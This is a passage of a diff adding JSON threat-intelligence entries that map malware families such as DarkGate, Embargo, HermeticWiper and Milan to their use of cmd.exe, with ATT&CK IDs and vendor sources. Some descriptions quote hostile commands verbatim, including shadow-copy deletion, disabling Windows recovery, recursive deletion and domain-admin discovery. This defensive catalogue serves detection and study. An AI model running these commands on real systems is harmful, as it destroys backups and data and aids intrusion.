+        "sources": "Microsoft GALLIUM December 2019 https://www.microsoft.com/security/blog/2019/12/12/gallium-targeting-global-telecom/"
+      },
+      {
+        "name": "BLINDINGCAN",
+        "attack_id": "S0520",
+        "evidence": "names cmd.exe",
+        "description": "BLINDINGCAN has executed commands via cmd.exe.",
+        "sources": "US-CERT BLINDINGCAN Aug 2020 https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a"
+      },
+      {
+        "name": "BONDUPDATER",
+        "attack_id": "S0360",
+        "evidence": "names cmd.exe",
+        "description": "BONDUPDATER can read batch commands in a file sent from its C2 server and execute them with cmd.exe.",
+        "sources": "Palo Alto OilRig Sep 2018 https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/"
+      },
+      {
+        "name": "Bumblebee",
+        "attack_id": "S1039",
+        "evidence": "names cmd.exe",
+        "description": "Bumblebee can use `cmd.exe` to drop and run files.",
+        "sources": "Proofpoint Bumblebee April 2022 https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming; Google EXOTIC LILY March 2022 https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/"
+      },
+      {
+        "name": "CALENDAR",
+        "attack_id": "S0025",
+        "evidence": "names cmd.exe",
+        "description": "CALENDAR has a command to run cmd.exe to execute commands.",
+        "sources": "Mandiant APT1 Appendix https://www.mandiant.com/sites/default/files/2021-09/mandiant-apt1-report.pdf"
+      },
+      {
+        "name": "ccf32",
+        "attack_id": "S1043",
+        "evidence": "names cmd.exe",
+        "description": "ccf32 has used `cmd.exe` for archiving data and deleting files.",
+        "sources": "Bitdefender FunnyDream Campaign November 2020 https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "name": "Chaes",
+        "attack_id": "S0631",
+        "evidence": "names cmd.exe",
+        "description": "Chaes has used cmd to execute tasks on the system.",
+        "sources": "Cybereason Chaes Nov 2020 https://www.cybereason.com/hubfs/dam/collateral/reports/11-2020-Chaes-e-commerce-malware-research.pdf"
+      },
+      {
+        "name": "Clambling",
+        "attack_id": "S0660",
+        "evidence": "names cmd.exe",
+        "description": "Clambling can use cmd.exe for command execution.",
+        "sources": "Trend Micro DRBControl February 2020 https://documents.trendmicro.com/assets/white_papers/wp-uncovering-DRBcontrol.pdf"
+      },
+      {
+        "name": "Clop",
+        "attack_id": "S0611",
+        "evidence": "names cmd.exe",
+        "description": "Clop can use cmd.exe to help execute commands on the system.",
+        "sources": "Cybereason Clop Dec 2020 https://www.cybereason.com/blog/cybereason-vs.-clop-ransomware"
+      },
+      {
+        "name": "Cobalt Strike",
+        "attack_id": "S0154",
+        "evidence": "names cmd.exe",
+        "description": "Cobalt Strike's Beacon payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe Cobalt Strike can also use `CreateThreadpoolWait`, `SetThreadpoolWait`, and `MessageBoxA` for sandbox evasion and execution of embedded payloads in memory.",
+        "sources": "Talos Cobalt Strike September 2020 https://web.archive.org/web/20210219195905/https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/031/original/Talos_Cobalt_Strike.pdf; cobaltstrike manual https://web.archive.org/web/20210825130434/https://cobaltstrike.com/downloads/csmanual38.pdf; Cobalt Strike Manual 4.3 November 2020 https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf; Cisco Talos Qilin Ransomware OCT 2025 https://blog.talosintelligence.com/uncovering-qilin-attack-methods-exposed-through-multiple-cases/"
+      },
+      {
+        "name": "ComRAT",
+        "attack_id": "S0126",
+        "evidence": "names cmd.exe",
+        "description": "ComRAT has used cmd.exe to execute commands.",
+        "sources": "ESET ComRAT May 2020 https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf"
+      },
+      {
+        "name": "CozyCar",
+        "attack_id": "S0046",
+        "evidence": "names cmd.exe",
+        "description": "A module in CozyCar allows arbitrary commands to be executed by invoking C:\\Windows\\System32\\cmd.exe.",
+        "sources": "F-Secure CozyDuke https://www.f-secure.com/documents/996508/1030745/CozyDuke"
+      },
+      {
+        "name": "Cuba",
+        "attack_id": "S0625",
+        "evidence": "names cmd.exe",
+        "description": "Cuba has used cmd.exe /c and batch files for execution. Cuba can use the command cmd.exe /c del to delete its artifacts from the system.",
+        "sources": "McAfee Cuba April 2021 https://www.mcafee.com/enterprise/en-us/assets/reports/rp-cuba-ransomware.pdf"
+      },
+      {
+        "name": "DanBot",
+        "attack_id": "S1014",
+        "evidence": "names cmd.exe",
+        "description": "DanBot has the ability to execute arbitrary commands via `cmd.exe`.",
+        "sources": "ClearSky Siamesekitten August 2021 https://www.clearskysec.com/siamesekitten/; SecureWorks August 2019 https://www.secureworks.com/blog/lyceum-takes-center-stage-in-middle-east-campaign"
+      },
+      {
+        "name": "DarkGate",
+        "attack_id": "S1111",
+        "evidence": "names cmd.exe",
+        "description": "DarkGate can delete system restore points through the command cmd.exe /c vssadmin delete shadows /for=c: /all /quiet”. DarkGate uses a malicious Windows Batch script to run the Windows code utility to retrieve follow-on script payloads. DarkGate has also used `cmd.exe` to create a remote shell.",
+        "sources": "Ensilo Darkgate 2018 https://www.fortinet.com/blog/threat-research/enter-the-darkgate-new-cryptocurrency-mining-and-ransomware-campaign; Trellix Darkgate 2023 https://www.trellix.com/blogs/research/the-continued-evolution-of-the-darkgate-malware-as-a-service/; Rapid7 BlackBasta 2024 https://www.rapid7.com/blog/post/2024/12/04/black-basta-ransomware-campaign-drops-zbot-darkgate-and-custom-malware/"
+      },
+      {
+        "name": "DarkTortilla",
+        "attack_id": "S1066",
+        "evidence": "names cmd.exe",
+        "description": "DarkTortilla can use `cmd.exe` to add registry keys for persistence.",
+        "sources": "Secureworks DarkTortilla Aug 2022 https://www.secureworks.com/research/darktortilla-malware-analysis"
+      },
+      {
+        "name": "DarkWatchman",
+        "attack_id": "S0673",
+        "evidence": "names cmd.exe",
+        "description": "DarkWatchman can use `cmd.exe` to execute commands.",
+        "sources": "Prevailion DarkWatchman 2021 https://web.archive.org/web/20220629230035/https://www.prevailion.com/darkwatchman-new-fileless-techniques/"
+      },
+      {
+        "name": "DnsSystem",
+        "attack_id": "S1021",
+        "evidence": "names cmd.exe",
+        "description": "DnsSystem can use `cmd.exe` for execution.",
+        "sources": "Zscaler Lyceum DnsSystem June 2022 https://www.zscaler.com/blogs/security-research/lyceum-net-dns-backdoor"
+      },
+      {
+        "name": "Dtrack",
+        "attack_id": "S0567",
+        "evidence": "names cmd.exe",
+        "description": "Dtrack has used cmd.exe to add a persistent service.",
+        "sources": "CyberBit Dtrack https://www.cyberbit.com/blog/endpoint-security/dtrack-apt-malware-found-in-nuclear-power-plant/"
+      },
+      {
+        "name": "DUSTTRAP",
+        "attack_id": "S1159",
+        "evidence": "names cmd.exe",
+        "description": "DUSTTRAP can execute commands via `cmd.exe`.",
+        "sources": "Google Cloud APT41 2024 https://cloud.google.com/blog/topics/threat-intelligence/apt41-arisen-from-dust"
+      },
+      {
+        "name": "ECCENTRICBANDWAGON",
+        "attack_id": "S0593",
+        "evidence": "names cmd.exe",
+        "description": "ECCENTRICBANDWAGON can use cmd to execute commands on a victim’s machine.",
+        "sources": "CISA EB Aug 2020 https://us-cert.cisa.gov/ncas/analysis-reports/ar20-239a"
+      },
+      {
+        "name": "Egregor",
+        "attack_id": "S0554",
+        "evidence": "names cmd.exe",
+        "description": "Egregor has used batch files for execution and can launch Internet Explorer from cmd.exe.",
+        "sources": "JoeSecurity Egregor 2020 https://www.joesandbox.com/analysis/326673/0/pdf; Cybereason Egregor Nov 2020 https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware"
+      },
+      {
+        "name": "Embargo",
+        "attack_id": "S1247",
+        "evidence": "names cmd.exe",
+        "description": "Embargo has cleared files from the recycle bin by invoking `SHEmptyRecycleBinW()` and disabled Windows recovery through `C:\\Windows\\System32\\cmd.exe /q /c bcdedit /set {default} recoveryenabled no`.",
+        "sources": "Cyble Embargo Ransomware May 2024 https://cyble.com/blog/the-rust-revolution-new-embargo-ransomware-steps-in/"
+      },
+      {
+        "name": "Emotet",
+        "attack_id": "S0367",
+        "evidence": "names cmd.exe",
+        "description": "Emotet has obfuscated macros within malicious documents to hide the URLs hosting the malware, CMD.exe arguments, and PowerShell scripts. Emotet has used cmd.exe to run a PowerShell script.",
+        "sources": "Talos Emotet Jan 2019 https://blog.talosintelligence.com/2019/01/return-of-emotet.html; Picus Emotet Dec 2018 https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html; ESET Emotet Dec 2018 https://www.welivesecurity.com/2018/12/28/analysis-latest-emotet-propagation-campaign/; Trend Micro Emotet Jan 2019 https://documents.trendmicro.com/assets/white_papers/ExploringEmotetsActivities_Final.pdf"
+      },
+      {
+        "name": "EnvyScout",
+        "attack_id": "S0634",
+        "evidence": "names cmd.exe",
+        "description": "EnvyScout can use cmd.exe to execute malicious files on compromised hosts.",
+        "sources": "MSTIC Nobelium Toolset May 2021 https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/"
+      },
+      {
+        "name": "Flagpro",
+        "attack_id": "S0696",
+        "evidence": "names cmd.exe",
+        "description": "Flagpro can use `cmd.exe` to execute commands received from C2.",
+        "sources": "NTT Security Flagpro new December 2021 https://insight-jp.nttsecurity.com/post/102hf3q/flagpro-the-new-malware-used-by-blacktech"
+      },
+      {
+        "name": "FunnyDream",
+        "attack_id": "S1044",
+        "evidence": "names cmd.exe",
+        "description": "FunnyDream can use `cmd.exe` for execution on remote hosts.",
+        "sources": "Bitdefender FunnyDream Campaign November 2020 https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "name": "Gazer",
+        "attack_id": "S0168",
+        "evidence": "names cmd.exe",
+        "description": "Gazer can establish persistence by creating a.lnk file in the Start menu or by modifying existing.lnk files to execute the malware through cmd.exe.",
+        "sources": "ESET Gazer Aug 2017 https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf; Securelist WhiteBear Aug 2017 https://securelist.com/introducing-whitebear/81638/"
+      },
+      {
+        "name": "Gold Dragon",
+        "attack_id": "S0249",
+        "evidence": "names cmd.exe",
+        "description": "Gold Dragon uses cmd.exe to execute commands for discovery.",
+        "sources": "McAfee Gold Dragon https://www.mcafee.com/blogs/other-blogs/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/"
+      },
+      {
+        "name": "Goopy",
+        "attack_id": "S0477",
+        "evidence": "names cmd.exe",
+        "description": "Goopy has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.",
+        "sources": "Cybereason Cobalt Kitty 2017 https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "name": "GreyEnergy",
+        "attack_id": "S0342",
+        "evidence": "names cmd.exe",
+        "description": "GreyEnergy uses cmd.exe to execute itself in-memory.",
+        "sources": "ESET GreyEnergy Oct 2018 https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf"
+      },
+      {
+        "name": "H1N1",
+        "attack_id": "S0132",
+        "evidence": "names cmd.exe",
+        "description": "H1N1 kills and disables services by using cmd.exe.",
+        "sources": "Cisco H1N1 Part 2 https://web.archive.org/web/20231210122239/https://blogs.cisco.com/security/h1n1-technical-analysis-reveals-new-capabilities-part-2"
+      },
+      {
+        "name": "Hannotog",
+        "attack_id": "S1211",
+        "evidence": "names cmd.exe",
+        "description": "Hannotog can execute various `cmd.exe /c %s` commands.",
+        "sources": "Symantec Bilbug 2022 https://www.security.com/threat-intelligence/espionage-asia-governments-cert-authority"
+      },
+      {
+        "name": "HARDRAIN",
+        "attack_id": "S0246",
+        "evidence": "names cmd.exe",
+        "description": "HARDRAIN uses the command cmd.exe /c netsh firewall add portopening TCP 443 \"adp\" and makes the victim machine function as a proxy server. HARDRAIN uses cmd.exe to execute netshcommands.",
+        "sources": "US-CERT HARDRAIN March 2018 https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf"
+      },
+      {
+        "name": "Havoc",
+        "attack_id": "S1229",
+        "evidence": "names cmd.exe",
+        "description": "Havoc can execute commands via `cmd.exe`.",
+        "sources": "Immersive Labs Havoc C2 APR 2024 https://www.immersivelabs.com/resources/blog/havoc-c2-framework-a-defensive-operators-guide; Havoc Framework Documentation https://havocframework.com/docs/welcome"
+      },
+      {
+        "name": "HAWKBALL",
+        "attack_id": "S0391",
+        "evidence": "names cmd.exe",
+        "description": "HAWKBALL has created a cmd.exe reverse shell, executed commands, and uploaded output via the command line.",
+        "sources": "FireEye HAWKBALL Jun 2019 https://www.fireeye.com/blog/threat-research/2019/06/government-in-central-asia-targeted-with-hawkball-backdoor.html"
+      },
+      {
+        "name": "HeartCrypt",
+        "attack_id": "S9018",
+        "evidence": "names cmd.exe",
+        "description": "HeartCrypt can use the `reg add` command via `cmd.exe` for Registry modification.",
+        "sources": "Palo Alto HeartCrypt DEC 2024 https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/"
+      },
+      {
+        "name": "HermeticWiper",
+        "attack_id": "S0697",
+        "evidence": "names cmd.exe",
+        "description": "HermeticWiper can use `cmd.exe /Q/c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\127.0.0.1\\ADMIN$\\_1636727589.6007507 2>&1` to deploy on an infected system.",
+        "sources": "ESET Hermetic Wizard March 2022 https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine"
+      },
+      {
+        "name": "HermeticWizard",
+        "attack_id": "S0698",
+        "evidence": "names cmd.exe",
+        "description": "HermeticWizard can use `cmd.exe` for execution on compromised hosts. HermeticWizard can use WMI to create a new process on a remote machine via `C:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\regsvr32.exe /s /iC:\\windows\\<filename>.dll`.",
+        "sources": "ESET Hermetic Wizard March 2022 https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine"
+      },
+      {
+        "name": "HOPLIGHT",
+        "attack_id": "S0376",
+        "evidence": "names cmd.exe",
+        "description": "HOPLIGHT can launch cmd.exe to execute commands on the system.",
+        "sources": "US-CERT HOPLIGHT Apr 2019 https://www.us-cert.gov/ncas/analysis-reports/AR19-100A"
+      },
+      {
+        "name": "httpclient",
+        "attack_id": "S0068",
+        "evidence": "names cmd.exe",
+        "description": "httpclient opens cmd.exe on the victim.",
+        "sources": "CrowdStrike Putter Panda http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf"
+      },
+      {
+        "name": "IcedID",
+        "attack_id": "S0483",
+        "evidence": "names cmd.exe",
+        "description": "IcedID can inject a Cobalt Strike beacon into cmd.exe via process hallowing. IcedID used the following command to check the country/language of the active console: ` cmd.exe /c chcp >&2`.",
+        "sources": "DFIR_Quantum_Ransomware https://thedfirreport.com/2022/04/25/quantum-ransomware/"
+      },
+      {
+        "name": "IPsec Helper",
+        "attack_id": "S1132",
+        "evidence": "names cmd.exe",
+        "description": "IPsec Helper can run arbitrary commands passed to it through cmd.exe.",
+        "sources": "SentinelOne Agrius 2021 https://assets.sentinelone.com/sentinellabs/evol-agrius"
+      },
+      {
+        "name": "Ixeshe",
+        "attack_id": "S0015",
+        "evidence": "names cmd.exe",
+        "description": "Ixeshe is capable of executing commands via cmd.",
+        "sources": "Trend Micro IXESHE 2012 https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf"
+      },
+      {
+        "name": "JCry",
+        "attack_id": "S0389",
+        "evidence": "names cmd.exe",
+        "description": "JCry has used cmd.exe to launch PowerShell.",
+        "sources": "Carbon Black JCry May 2019 https://www.carbonblack.com/2019/05/14/cb-tau-threat-intelligence-notification-jcry-ransomware-pretends-to-be-adobe-flash-player-update-installer/"
+      },
+      {
+        "name": "Kasidet",
+        "attack_id": "S0088",
+        "evidence": "names cmd.exe",
+        "description": "Kasidet can execute commands using cmd.exe.",
+        "sources": "Zscaler Kasidet http://research.zscaler.com/2016/01/malicious-office-files-dropping-kasidet.html"
+      },
+      {
+        "name": "Kazuar",
+        "attack_id": "S0265",
+        "evidence": "names cmd.exe",
+        "description": "Kazuar uses cmd.exe to execute commands on the victim’s machine.",
+        "sources": "Unit 42 Kazuar May 2017 https://researchcenter.paloaltonetworks.com/2017/05/unit42-kazuar-multiplatform-espionage-backdoor-api-access/"
+      },
+      {
+        "name": "Kevin",
+        "attack_id": "S1020",
+        "evidence": "names cmd.exe",
+        "description": "Kevin can use a renamed image of `cmd.exe` for execution. Kevin has renamed an image of `cmd.exe` with a random name followed by a `.tmpl` extension.",
+        "sources": "Kaspersky Lyceum October 2021 https://vblocalhost.com/uploads/VB2021-Kayal-etal.pdf"
+      },
+      {
+        "name": "KEYMARBLE",
+        "attack_id": "S0271",
+        "evidence": "names cmd.exe",
+        "description": "KEYMARBLE can execute shell commands using cmd.exe.",
+        "sources": "US-CERT KEYMARBLE Aug 2018 https://www.us-cert.gov/ncas/analysis-reports/AR18-221A"
+      },
+      {
+        "name": "KGH_SPY",
+        "attack_id": "S0526",
+        "evidence": "names cmd.exe",
+        "description": "KGH_SPY has the ability to set a Registry key to run a cmd.exe command.",
+        "sources": "Cybereason Kimsuky November 2020 https://www.cybereason.com/blog/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite"
+      },
+      {
+        "name": "KOCTOPUS",
+        "attack_id": "S0669",
+        "evidence": "names cmd.exe",
+        "description": "KOCTOPUS has used `cmd.exe` and batch files for execution.",
+        "sources": "MalwareBytes LazyScripter Feb 2021 https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+      },
+      {
+        "name": "KONNI",
+        "attack_id": "S0356",
+        "evidence": "names cmd.exe",
+        "description": "KONNI has duplicated the token of a high integrity process to spawn an instance of cmd.exe under an impersonated user. KONNI has used cmd.exe to execute arbitrary commands on the infected host across different stages of the infection chain.",
+        "sources": "Medium KONNI Jan 2020 https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b; Malwarebytes Konni Aug 2021 https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/; Talos Konni May 2017 https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html"
+      },
+      {
+        "name": "LAMEHUG",
+        "attack_id": "S9035",
+        "evidence": "names cmd.exe",
+        "description": "LAMEHUG can use `cmd.exe` to display a decoy file to spearphishing victims.",
+        "sources": "Splunk LAMEHUG SEP 2025 https://www.splunk.com/en_us/blog/security/lamehug-ai-driven-malware-llm-cyber-intrusion-analysis.html"
+      },
+      {
+        "name": "Latrodectus",
+        "attack_id": "S1160",
+        "evidence": "names cmd.exe",
+        "description": "Latrodectus can run `C:\\Windows\\System32\\cmd.exe /c nltest /domain_trusts` to discover domain trusts. Latrodectus can run `C:\\Windows\\System32\\cmd.exe /c net view /all` to discover network shares. Latrodectus can run `C:\\Windows\\System32\\cmd.exe /c net group \"Domain Admins\" /domain` to identify domain administrator accounts. Latrodectus can identify domain groups through `cmd.exe /c net group \"Domain Admins\" /domain`.",
+        "sources": "Bitsight Latrodectus June 2024 https://www.bitsight.com/blog/latrodectus-are-you-coming-back; Elastic Latrodectus May 2024 https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus"
+      },
+      {
+        "name": "LightNeuron",
+        "attack_id": "S0395",
+        "evidence": "names cmd.exe",
+        "description": "LightNeuron is capable of executing commands via cmd.exe.",
+        "sources": "ESET LightNeuron May 2019 https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf"
+      },
+      {
+        "name": "LookBack",
+        "attack_id": "S0582",
+        "evidence": "names cmd.exe",
+        "description": "LookBack executes the cmd.exe command.",
+        "sources": "Proofpoint LookBack Malware Aug 2019 https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks"
+      },
+      {
+        "name": "LunarWeb",
+        "attack_id": "S1141",
+        "evidence": "names cmd.exe",
+        "description": "LunarWeb can run shell commands using a BAT file with a name matching `%TEMP%\\<⁠random_9_alnum_chars>.batfile` or through cmd.exe with the `/c` and `/U` option for Unicode output.",
+        "sources": "ESET Turla Lunar toolset May 2024 https://www.welivesecurity.com/en/eset-research/moon-backdoors-lunar-landing-diplomatic-missions/"
+      },
+      {
+        "name": "Mafalda",
+        "attack_id": "S1060",
+        "evidence": "names cmd.exe",
+        "description": "Mafalda can execute shell commands using `cmd.exe`.",
+        "sources": "SentinelLabs Metador Technical Appendix Sept 2022 https://docs.google.com/document/d/1e9ZTW9b71YwFWS_18ZwDAxa-cYbV8q1wUefmKZLYVsA/edit#heading=h.lmnbtht1ikzm"
+      },
+      {
+        "name": "Manjusaka",
+        "attack_id": "S1156",
+        "evidence": "names cmd.exe",
+        "description": "Manjusaka can execute arbitrary commands passed to it from the C2 controller via `cmd.exe /c`.",
+        "sources": "Talos Manjusaka 2022 https://blog.talosintelligence.com/manjusaka-offensive-framework/"
+      },
+      {
+        "name": "MarkiRAT",
+        "attack_id": "S0652",
+        "evidence": "names cmd.exe",
+        "description": "MarkiRAT can utilize cmd.exe to execute commands in a victim's environment.",
+        "sources": "Kaspersky Ferocious Kitten Jun 2021 https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/"
+      },
+      {
+        "name": "Medusa Ransomware",
+        "attack_id": "S1244",
+        "evidence": "names cmd.exe",
+        "description": "Medusa Ransomware has used `cmd.exe` to execute command on an infected host.",
+        "sources": "Palo Alto Unit 42 Medusa Group Medusa Ransomware January 2024 https://unit42.paloaltonetworks.com/medusa-ransomware-escalation-new-leak-site/; Security Scorecard Medusa Ransomware January 2024 https://securityscorecard.com/wp-content/uploads/2024/01/deep-dive-into-medusa-ransomware.pdf"
+      },
+      {
+        "name": "Megazord",
+        "attack_id": "S1191",
+        "evidence": "names cmd.exe",
+        "description": "Megazord can execute multiple commands post infection via `cmd.exe`.",
+        "sources": "Palo Alto Howling Scorpius DEC 2024 https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/"
+      },
+      {
+        "name": "Metamorfo",
+        "attack_id": "S0455",
+        "evidence": "names cmd.exe",
+        "description": "Metamorfo has used cmd.exe /c to execute files.",
+        "sources": "Medium Metamorfo Apr 2020 https://medium.com/@chenerlich/the-avast-abuser-metamorfo-banking-malware-hides-by-abusing-avast-executable-ac9b8b392767"
+      },
+      {
+        "name": "Micropsia",
+        "attack_id": "S0339",
+        "evidence": "names cmd.exe",
+        "description": "Micropsia creates a command-line shell using cmd.exe.",
+        "sources": "Radware Micropsia July 2018 https://www.radware.com/blog/security/2018/07/micropsia-malware/"
+      },
+      {
+        "name": "Milan",
+        "attack_id": "S1015",
+        "evidence": "names cmd.exe",
+        "description": "Milan has run `C:\\Windows\\system32\\cmd.exe /c cmd /c dir c:\\users\\ /s 2>&1` to discover local accounts. Milan can use `cmd.exe` for discovery actions on a targeted system. Milan can delete files via `C:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q`. Milan can run `C:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1` to discover network settings.",
+        "sources": "ClearSky Siamesekitten August 2021 https://www.clearskysec.com/siamesekitten/"
+      },
+      {
+        "name": "MiniFast",
+        "attack_id": "S9052",
+        "evidence": "names cmd.exe",
+        "description": "MiniFast has executed commands using `cmd.exe`.",
+        "sources": "CheckPoint_NimbusManticore_May2026 https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/"
+      },
+      {
+        "name": "MirageFox",
+        "attack_id": "S0280",
+        "evidence": "names cmd.exe",
+        "description": "MirageFox has the capability to execute commands using cmd.exe.",
+        "sources": "APT15 Intezer June 2018 https://web.archive.org/web/20180615122133/https://www.intezer.com/miragefox-apt15-resurfaces-with-new-tools-based-on-old-ones/"
+      },
+      {
+        "name": "Mis-Type",
+        "attack_id": "S0084",
+        "evidence": "names cmd.exe",
+        "description": "Mis-Type has used `cmd.exe` to run commands on a compromised host. Mis-Type may create a file containing the results of the command cmd.exe /c ipconfig /all. Mis-Type may create a file containing the results of the command cmd.exe /c net user {Username}.",
+        "sources": "Cylance Dust Storm https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf"
+      },
+      {
+        "name": "More_eggs",
+        "attack_id": "S0284",
+        "evidence": "names cmd.exe",
+        "description": "More_eggs has used cmd.exe for execution.",
+        "sources": "Security Intelligence More Eggs Aug 2019 https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/; ESET EvilNum July 2020 https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/"
+      },
+      {
+        "name": "Mosquito",
+        "attack_id": "S0256",
+        "evidence": "names cmd.exe",
+        "description": "Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.",
+        "sources": "ESET Turla Mosquito Jan 2018 https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
+      },
+      {
+        "name": "MuddyViper",
+        "attack_id": "S9032",
+        "evidence": "names cmd.exe",
+        "description": "MuddyViper has used cmd.exe to launch a reverse shell.",
+        "sources": "ESET_MuddyWater_Dec2025 https://www.welivesecurity.com/en/eset-research/muddywater-snakes-riverbank/"
+      },
+      {
+        "name": "NavRAT",
+        "attack_id": "S0247",
+        "evidence": "names cmd.exe",
+        "description": "NavRAT leverages cmd.exe to perform discovery techniques. NavRAT loads malicious shellcode and executes it in memory.",
+        "sources": "Talos NavRAT May 2018 https://blog.talosintelligence.com/2018/05/navrat.html"
+      },
+      {
+        "name": "NETWIRE",
+        "attack_id": "S0198",
+        "evidence": "names cmd.exe",
+        "description": "NETWIRE can issue commands using cmd.exe.",
+        "sources": "Red Canary NETWIRE January 2020 https://redcanary.com/blog/netwire-remote-access-trojan-on-linux/; Proofpoint NETWIRE December 2020 https://www.proofpoint.com/us/blog/threat-insight/geofenced-netwire-campaigns"
+      },
+      {
+        "name": "Nightdoor",
+        "attack_id": "S1147",
+        "evidence": "names cmd.exe",
+        "description": "Nightdoor creates a cmd.exe shell to send and receive commands from the command and control server via open pipes.",
+        "sources": "Symantec Daggerfly 2024 https://symantec-enterprise-blogs.security.com/threat-intelligence/daggerfly-espionage-updated-toolset"
+      },
+      {
+        "name": "OceanSalt",
+        "attack_id": "S0346",
+        "evidence": "names cmd.exe",
+        "description": "OceanSalt can create a reverse shell on the infected endpoint using cmd.exe. OceanSalt has been executed via malicious macros.",
+        "sources": "McAfee Oceansalt Oct 2018 https://www.mcafee.com/enterprise/en-us/assets/reports/rp-operation-oceansalt.pdf"
+      },
+      {
+        "name": "Okrum",
+        "attack_id": "S0439",
+        "evidence": "names cmd.exe",
+        "description": "Okrum's backdoor has used cmd.exe to execute arbitrary commands as well as batch scripts to update itself to a newer version.",
+        "sources": "ESET Okrum July 2019 https://www.welivesecurity.com/wp-content/uploads/2019/07/ESET_Okrum_and_Ketrican.pdf"
+      },
+      {
+        "name": "OutSteel",
+        "attack_id": "S1017",
+        "evidence": "names cmd.exe",
+        "description": "OutSteel has used `cmd.exe` to scan a compromised host for specific file extensions.",
+        "sources": "Palo Alto Unit 42 OutSteel SaintBot February 2022  https://unit42.paloaltonetworks.com/ukraine-targeted-outsteel-saintbot/"
+      },
+      {
+        "name": "Pikabot",
+        "attack_id": "S1145",
+        "evidence": "names cmd.exe",
+        "description": "Pikabot can execute Windows shell commands via cmd.exe.",
+        "sources": "Zscaler Pikabot 2023 https://www.zscaler.com/blogs/security-research/technical-analysis-pikabot"
+      },
+      {
+        "name": "PingPull",
+        "attack_id": "S1031",
+        "evidence": "names cmd.exe",
+        "description": "PingPull can use `cmd.exe` to run various commands as a reverse shell.",
+        "sources": "Unit 42 PingPull Jun 2022 https://unit42.paloaltonetworks.com/pingpull-gallium/"
+      },
+      {
+        "name": "Pisloader",
+        "attack_id": "S0124",
+        "evidence": "names cmd.exe",
+        "description": "Pisloader uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.",
+        "sources": "Palo Alto DNS Requests http://researchcenter.paloaltonetworks.com/2016/05/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/"
+      },
+      {
+        "name": "PLAINTEE",
+        "attack_id": "S0254",
+        "evidence": "names cmd.exe",
+        "description": "PLAINTEE uses cmd.exe to execute commands on the victim’s machine.",
+        "sources": "Rancor Unit42 June 2018 https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "name": "PowerDuke",
+        "attack_id": "S0139",
+        "evidence": "names cmd.exe",
+        "description": "PowerDuke runs cmd.exe /c and sends the output to its C2.",
+        "sources": "Volexity PowerDuke November 2016 https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+      },
+      {
+        "name": "Proxysvc",
+        "attack_id": "S0238",
+        "evidence": "names cmd.exe",
+        "description": "Proxysvc executes a binary on the system and logs the results into a temp file by using: cmd.exe /c \"<file_path> > %temp%\\PM*.tmp 2>&1\".",
